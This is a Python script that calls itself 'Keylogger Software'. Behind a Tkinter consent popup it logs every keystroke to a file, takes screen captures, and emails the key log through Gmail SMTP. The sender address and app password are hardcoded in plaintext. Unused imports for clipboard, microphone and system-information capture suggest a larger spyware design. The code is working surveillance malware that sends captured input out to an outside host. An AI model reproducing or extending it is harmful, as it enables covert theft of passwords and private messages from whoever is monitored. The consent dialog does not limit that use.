from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
import smtplib, ssl

from multiprocessing import Process, freeze_support
from PIL import ImageGrab



keys_information = "key_log.txt"
screenshot_information = 'screenshot.png'
keys_information_e = "e_key_log.txt"
file_path = 'C:\\Users\\Kodi_\\Documents\\keylogger'
extend = '\\'
file_merge = file_path + extend
email_address = "keyloggerproject952@gmail.com"  # Enter disposable email here
password = "jell pxnj dwqj fwjc"  # Enter email password here
key = 't-q7kCwsld-Wyj3b4vnK3p9yEWCKdoVJpnzoB-MA0oI='
username = getpass.getuser()

toaddr = "kodiugos@gmail.com"  # Enter the email address you want to send your information to

import tkinter as tk
from tkinter import scrolledtext
from tkinter import messagebox
import sys

def show_legal_popup():
    # Create main window
    legal_window = tk.Toplevel(root)
    legal_window.title("Ethical Compliance & Transparency Agreement")

    # Get the screen width and height
    screen_width = legal_window.winfo_screenwidth()
    screen_height = legal_window.winfo_screenheight()

    # Calculate the center position
    x = int((screen_width - 600) / 2)
    y = int((screen_height - 500) / 2)

    # Set the popup window size and position
    legal_window.geometry(f"600x500+{x}+{y}")

    # Text widget for legal terms
    legal_text = scrolledtext.ScrolledText(legal_window, width=50, height=15, wrap=tk.WORD)
    legal_text.insert(tk.INSERT, """
    Ethical Compliance & Transparency Agreement:

    By using this software, you agree to comply with ethical standards and transparency principles. This includes:

    1. Acknowledging the presence and purpose of the monitoring activities.
    2. Ensuring compliance with relevant privacy laws and regulations.
    3. Respecting user privacy and obtaining explicit consent before initiating monitoring.
    4. Implementing robust security measures to protect captured data.
    5. Minimizing the impact on system performance and user experience.

    Your consent to these terms is required for the ethical and responsible use of this software.

    Do you agree to comply with these ethical and transparency standards?

    """)

    legal_text.pack()

    # Buttons for consent and disagreement
    def on_agree():
        legal_window.destroy()  # Close the popup
        start_keylogger()  # Start the keylogger
    consent_button = tk.Button(legal_window, text="I Agree", command=on_agree)
    consent_button.pack(side=tk.LEFT, padx=10)

    def on_disagree():
        legal_window.destroy()  # Close the popup
        sys.exit()  # Terminate the entire program
    disagree_button = tk.Button(legal_window, text="I Disagree", command=on_disagree)
    disagree_button.pack(side=tk.RIGHT, padx=10)


count = 0
keys = []

def start_keylogger():
    # Rest of the keylogger functionality
    # ...
    def send_mail(
            sender_email=None,
            password=None,
            receiver_email=None,
            subject="No subject",
            message="U didn't add any message",
            attachment_path=None,
    ):
        import smtplib, ssl
        # Create a MIME object
        msg = MIMEMultipart()
        
        # Attach the message
        msg.attach(MIMEText(message, "plain"))
        
        if attachment_path:
            # Attach the file
            with open(attachment_path, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename= {attachment_path.split('/')[-1]}",
                )
                msg.attach(part)

        # Set the email subject, sender, and receiver
        msg["Subject"] = subject
        msg["From"] = sender_email
        msg["To"] = receiver_email

        # Establish a connection to the SMTP server
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            # Log in to the email account
            server.login(sender_email, password)
            
            # Send the email
            server.sendmail(sender_email, receiver_email, msg.as_string())


    # Example usage with attachment
    send_mail(
        sender_email=email_address,
        password=password,
        receiver_email=email_address,
        subject="Test Email with Attachment",
        message="Hello, this is a test email with an attachment!",
        attachment_path= file_merge + keys_information,  # Replace with the actual path to your attachment
    )


    # get screenshots
    def screenshot():
        im = ImageGrab.grab()
        im.save(file_path + extend + screenshot_information)


    screenshot()



    def on_press(key):
        global keys, count

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False


    # if currentTime > stoppingTime:
    #     return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()



    screenshot()

# Create main window
root = tk.Tk()
root.title("Keylogger Software")

# Button to show legal agreement popup
legal_button = tk.Button(root, text="Show Legal Agreement", command=show_legal_popup)
legal_button.pack()

root.mainloop()
